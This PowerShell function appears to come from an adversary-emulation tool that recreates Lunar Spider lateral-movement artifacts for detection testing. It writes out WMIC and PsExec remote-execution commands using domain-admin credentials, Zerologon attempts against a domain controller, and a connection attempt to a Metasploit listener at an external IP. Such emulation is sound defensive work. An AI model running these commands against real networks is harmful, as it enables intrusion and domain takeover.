# ============================================================================
# LUNAR SPIDER SIMULATION - PHASE 8: LATERAL MOVEMENT
# ============================================================================
# Simulates: WMIC remote exec of system.dl_ (failed), PsExec deployment of
# system.dl_ to DC / file share / backup server, Zerologon (CVE-2020-1472)
# attempts via zero.exe against a 2nd DC, a rejected Metasploit connection to
# 217.196.98[.]61:4444, and RDP pivots leaking the operator host VPS2DAY-32220LE.
# MITRE: T1047 WMI, T1021.002 SMB/PsExec, T1210 Exploit Remote Svc (Zerologon),
# T1021.001 RDP, T1570 Lateral Tool Transfer
# ============================================================================

function Simulate-LateralMovement {
    param($SimPaths)

    Write-Host "[+] Phase 8: Lateral Movement - WMIC / PsExec / Zerologon / RDP ..." -ForegroundColor Green

    $system = "$env:ALLUSERSPROFILE\system.dl_"
    if (-not (Test-Path $system)) { New-DecoyBinary -Path $system -SizeBytes 286720 | Out-Null }

    # --- WMIC remote execution attempt (Day 3, unsuccessful) ------------------
    $wmicCmd = 'wmic /node:DC01 process call create "rundll32 c:\programdata\system.dl_,StartUp471"'
    Set-Content -Path "$($SimPaths.Logs)\lateral_wmic.log" -Value $wmicCmd -Force
    Write-SimEvent -EventId 8001 -Message "SIMULATION: WMIC remote execution of system.dl_ attempted against DC (unsuccessful, per report)"

    # --- PsExec deployment (Day 4) --------------------------------------------
    $psexec = "$($SimPaths.Tools)\PsExec64.exe"
    New-DecoyBinary -Path $psexec -SizeBytes 819200 | Out-Null
    $psexecCmds = @(
        # First attempt failed (missing -accepteula), then the working form:
        'psexec \\DC01 -u CORP\Administrator -p (unattend-pw) "c:\programdata\system.dl_" rundll32 c:\programdata\system.dl_',
        'psexec \\DC01 -accepteula -u CORP\Administrator -p (unattend-pw) "c:\programdata\system.dl_" rundll32 c:\programdata\system.dl_',
        'psexec \\FS01 -accepteula -u CORP\Administrator -p (unattend-pw) "c:\programdata\system.dl_" rundll32 c:\programdata\system.dl_',
        'psexec \\BACKUP01 -accepteula -u CORP\Administrator -p (unattend-pw) "c:\programdata\system.dl_" rundll32 c:\programdata\system.dl_'
    )
    Set-Content -Path "$($SimPaths.Logs)\lateral_psexec.log" -Value ($psexecCmds -join "`r`n") -Force
    Write-SimEvent -EventId 8002 -Message "SIMULATION: PsExec deployed system.dl_ to DC / file share / backup server"

    # --- Zerologon (CVE-2020-1472) via zero.exe (Day 4) -----------------------
    $zero = "$env:ALLUSERSPROFILE\zero.exe"
    New-DecoyBinary -Path $zero -SizeBytes 40960 | Out-Null   # zero.exe (MD5 91889658... ref)
    $zeroAttempts = 1..8 | ForEach-Object { "zero.exe DC02 <account_$_>  # attempt $_" }
    Set-Content -Path "$($SimPaths.Logs)\lateral_zerologon.log" `
        -Value ("CVE-2020-1472 Zerologon - 8 attempts against 2nd DC (DC02):`r`n" + ($zeroAttempts -join "`r`n")) -Force
    Write-SimEvent -EventId 8003 -Message "SIMULATION: Zerologon (CVE-2020-1472) attempted 8x via zero.exe against second DC"

    # --- Metasploit lateral attempt (rejected) --------------------------------
    Invoke-SafeNetworkAttempt -Target $Global:LunarIOCs.MetasploitC2 -Port 4444
    Set-Content -Path "$($SimPaths.Logs)\lateral_metasploit.log" `
        -Value "Metasploit reverse to $($Global:LunarIOCs.MetasploitC2):4444 - connection rejected by server (per report)" -Force
    Write-SimEvent -EventId 8004 -Message "SIMULATION: Metasploit lateral attempt to 217.196.98.61:4444 (rejected)"

    # --- RDP pivots leaking operator VPS hostname (Day 5) ---------------------
    # Reproduce the RDP client artifact that leaks the operator's source hostname.
    $rdpKey = "HKCU:\Software\Microsoft\Terminal Server Client\Servers\DC01"
    New-Item -Path $rdpKey -Force | Out-Null
    Set-ItemProperty -Path $rdpKey -Name "UsernameHint" -Value "CORP\Administrator" -Force
    Set-Content -Path "$($SimPaths.Logs)\lateral_rdp.log" `
        -Value "RDP to FS01/BACKUP01 with domain-admin creds; source hostname leaked during auth: $($Global:LunarIOCs.OperatorRdpHost)" -Force
    Write-SimEvent -EventId 8005 -Message "SIMULATION: RDP pivots executed; operator source hostname VPS2DAY-32220LE observed in auth telemetry"

    Write-Host "  [OK] Lateral Movement artifacts created" -ForegroundColor Yellow
}
